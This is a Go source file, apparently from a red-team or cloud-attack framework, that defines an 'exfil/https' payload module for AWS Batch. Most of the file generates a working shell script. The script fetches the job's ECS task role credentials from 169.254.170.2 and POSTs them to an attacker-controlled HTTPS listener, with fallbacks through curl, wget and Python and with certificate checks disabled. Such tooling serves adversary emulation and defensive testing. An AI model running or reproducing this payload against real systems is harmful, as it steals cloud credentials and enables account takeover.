// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package batch

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ExfilHTTPSPayload generates a bash script that fetches the Batch job's task role
// credentials from the ECS task credential endpoint and POSTs them to an attacker
// HTTPS listener.
//
// Credential source: ECS/Fargate containers receive credentials via environment variables
// injected by the ECS agent:
//   - AWS_CONTAINER_CREDENTIALS_FULL_URI      — full URL (preferred, newer ECS)
//   - AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  — path suffix relative to 169.254.170.2
//
// HTTP client detection order (at runtime inside the container):
//   1. curl   — most common; skips TLS cert verification with -k for self-signed listeners
//   2. wget   — common on Debian/Ubuntu base images; uses --no-check-certificate
//   3. python3 — available on most distro base images; uses urllib with ssl context
//   4. python  — Python 2 fallback for older images; uses urllib2
//
// If none of these are found the job exits non-zero, which surfaces as a FAILED job in
// the DescribeJobs poll and gives a clear signal to retry with a different image.
//
// This payload requires CONTAINER_RUNTIME=generic in the module — it cannot run against
// amazon/aws-cli:latest because that image's entrypoint is "aws" and
// ContainerOverrides.Command cannot override the entrypoint.
type ExfilHTTPSPayload struct{}

func init() {
	_ = payloads.Register(&ExfilHTTPSPayload{})
}

func (p *ExfilHTTPSPayload) GetName() string {
	return "exfil/https"
}

func (p *ExfilHTTPSPayload) GetDescription() string {
	return "Exfiltrate Batch task role credentials to an attacker HTTPS endpoint; detects curl/wget/python at runtime (requires CONTAINER_RUNTIME=generic)"
}

func (p *ExfilHTTPSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueExfil,
		payloads.TagTransportHTTPS,
	}
}

func (p *ExfilHTTPSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "HTTPS_URL",
			Description: "Attacker-controlled HTTPS endpoint for credential collection (auto-populated by 'attacker listener start')",
			Required:    true,
		},
	}
}

func (p *ExfilHTTPSPayload) Validate(options map[string]string) error {
	httpsURL := options["HTTPS_URL"]
	if httpsURL == "" {
		return fmt.Errorf("HTTPS_URL is required for exfil/https payload")
	}
	if !strings.HasPrefix(httpsURL, "http://") && !strings.HasPrefix(httpsURL, "https://") {
		return fmt.Errorf("HTTPS_URL must start with http:// or https://")
	}
	return nil
}

// GenerateCode returns a POSIX sh script that:
//  1. Resolves the ECS task credential endpoint from environment variables
//  2. Detects which HTTP client is available (curl → wget → python3 → python)
//  3. Fetches credentials and POSTs them to the attacker HTTPS listener
//
// The module wraps this as ContainerOverrides.Command = ["sh", "-c", script]
// via CONTAINER_RUNTIME=generic.
func (p *ExfilHTTPSPayload) GenerateCode(options map[string]string) (string, error) {
	httpsURL := options["HTTPS_URL"]

	// The python3 and python snippets are embedded inline as single-quoted strings
	// inside the sh script. They use triple-backslash for literal backslash in the
	// sed/awk substitutions, and avoid single-quotes inside the python code since
	// the outer shell uses them as delimiters.
	script := fmt.Sprintf(`
if [ -n "${AWS_CONTAINER_CREDENTIALS_FULL_URI}" ]; then
  CREDS_URL="${AWS_CONTAINER_CREDENTIALS_FULL_URI}"
elif [ -n "${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" ]; then
  CREDS_URL="http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
else
  echo "exfil/https: no ECS credential endpoint env var found" >&2
  exit 1
fi

HTTPS_URL="%s"

fetch_and_post() {
  if command -v curl >/dev/null 2>&1; then
    CREDS=$(curl -sf "$CREDS_URL")
    curl -sk -X POST \
      -H "Content-Type: application/json" \
      -H "X-Pathrunner: batch-exfil" \
      -d "$CREDS" \
      "$HTTPS_URL"
    return $?
  fi

  if command -v wget >/dev/null 2>&1; then
    CREDS=$(wget -qO- "$CREDS_URL")
    wget -qO- \
      --post-data="$CREDS" \
      --header="Content-Type: application/json" \
      --header="X-Pathrunner: batch-exfil" \
      --no-check-certificate \
      "$HTTPS_URL"
    return $?
  fi

  if command -v python3 >/dev/null 2>&1; then
    python3 - "$CREDS_URL" "$HTTPS_URL" <<'PYEOF'
import sys, urllib.request, ssl
creds_url, https_url = sys.argv[1], sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
creds = urllib.request.urlopen(creds_url).read()
req = urllib.request.Request(https_url, data=creds,
  headers={"Content-Type": "application/json", "X-Pathrunner": "batch-exfil"})
urllib.request.urlopen(req, context=ctx)
PYEOF
    return $?
  fi

  if command -v python >/dev/null 2>&1; then
    python - "$CREDS_URL" "$HTTPS_URL" <<'PYEOF'
import sys, ssl
try:
  import urllib.request as urlreq
  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE
  creds_url, https_url = sys.argv[1], sys.argv[2]
  creds = urlreq.urlopen(creds_url).read()
  req = urlreq.Request(https_url, data=creds,
    headers={"Content-Type": "application/json", "X-Pathrunner": "batch-exfil"})
  urlreq.urlopen(req, context=ctx)
except ImportError:
  import urllib2
  creds_url, https_url = sys.argv[1], sys.argv[2]
  creds = urllib2.urlopen(creds_url).read()
  req = urllib2.Request(https_url, creds,
    {"Content-Type": "application/json", "X-Pathrunner": "batch-exfil"})
  urllib2.urlopen(req)
PYEOF
    return $?
  fi

  echo "exfil/https: no HTTP client found (tried curl, wget, python3, python)" >&2
  exit 1
}

fetch_and_post
`, httpsURL)

	// Trim leading newline from the heredoc-style string literal.
	return strings.TrimLeft(script, "\n"), nil
}

// ProcessResult formats a summary directing the operator to the listener for captured credentials.
func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
	var out strings.Builder
	out.WriteString("Credential exfiltration initiated.\n\n")
	out.WriteString("The Batch job fetched its task role credentials from the ECS task credential endpoint\n")
	out.WriteString("and POSTed them to the attacker listener at /collect.\n\n")
	out.WriteString("Detected HTTP client priority: curl > wget > python3 > python\n\n")
	out.WriteString("Run 'identity list' to see if they were auto-imported, or check 'attacker listener log'.\n")
	return out.String(), nil
}
